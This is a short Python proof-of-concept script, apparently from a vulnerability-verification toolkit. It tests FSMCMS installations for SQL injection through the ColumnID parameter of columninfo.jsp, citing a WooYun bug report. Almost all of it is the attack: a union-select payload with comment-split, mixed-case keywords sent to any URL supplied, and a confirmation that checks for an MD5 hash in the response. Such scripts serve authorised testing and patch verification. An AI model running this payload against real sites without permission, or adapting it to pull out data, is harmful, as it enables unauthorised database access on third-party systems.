#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FSMCMS columninfo.jsp文件参数ColumnID SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0144330
author: Lucifer
description: 文件columninfo.jsp中,参数ColumnID存在SQL注入。
'''
import sys
import requests



class fsmcms_columninfo_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/fsmcms/cms/web/columninfo.jsp?ColumnID=-5/**/UnIoN/**/SeLeCt/**/1,2,Md5(1234),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在FSMCMS columninfo.jsp文件参数ColumnID SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = fsmcms_columninfo_sqli_BaseVerify(sys.argv[1])
    testVuln.run()